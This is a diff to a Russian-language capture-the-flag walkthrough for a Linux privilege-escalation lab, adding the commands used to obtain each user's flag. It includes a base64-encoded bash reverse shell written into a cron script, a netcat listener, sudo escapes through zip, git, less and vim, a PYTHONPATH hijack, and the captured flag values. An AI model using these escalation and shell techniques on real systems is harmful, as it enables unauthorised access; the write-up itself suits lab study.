@@ -345,28 +345,75 @@ su в пользователя viktor, используя флаг viktor в к�
 ```commandline
 su viktor
 cat /etc/crontab
+cat /opt/scripts/47.sh
 
+vim eop.sh
+#!/bin/bash
+bash -i >& /dev/tcp/127.0.0.1/9999 0>&1
+
+cat eop.sh | base64 -w 0
+echo 'IyEvYmluL2Jhc2gKYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvOTk5OSAwPiYx' | base64 -d > /opt/scripts/47.sh
+netcat -nlp 9999
+id
+cat /home/dalia/flag.txt
 ```
 ```commandline
 dalia{4a94a7a7bb4a819a63a33979926c77dc}
 ```
 Какой флаг у Сильвио?
 ```commandline
+sudo -l
+TF=$(mktemp -u)
+sudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
+export TERM=xterm
+export SHELL=bash
+stty raw -echo
+fg
+cat /home/silvio/flag.txt
+```
+```commandline
 silvio{657b4d058c03ab9988875bc937f9c2ef}
 ```
 Какой флаг у Резы?
+```commandline
+sudo -l
+gtfoblookup linux sudo git
+sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p help
+id
+cd /home/reza
+cat flag.txt
+```
 ```commandline
 reza{2f1901644eda75306f3142d837b80d3e}
 ```
 Какой флаг у Иордании?
 ```commandline
+sudo -l
+sudo -u jordan /opt/scripts/Gun-Shop.py
+mkdir -p /tmp/shop; echo 'import os; os.system("/bin/bash");' > /tmp/shop/shop.py
+sudo -u jordan PYTHONPATH=/tmp/shop/ /opt/scripts/Gun-Shop.py
+'}3c3e9f8796493b98285b9c13c3b4cbcf{nadroj'.reverse
+```
+```commandline
 jordan{fcbc4b3c31c9b58289b3946978f9e3c3}
 ```
 Какой флаг у Кена?
 ```commandline
+sudo -l
+sudo -u ken /usr/bin/less /etc/os-release
+cd /home/jordan 
+id
+cat flag.txt
+```
+```commandline
 ken{4115bf456d1aaf012ed4550c418ba99f}
 ```
 Какой флаг у Шона?
+```commandline
+sudo -l
+sudo -u sean vim
+
+```
 ```commandline
 sean{4c5685f4db7966a43cf8e95859801281}
 ```
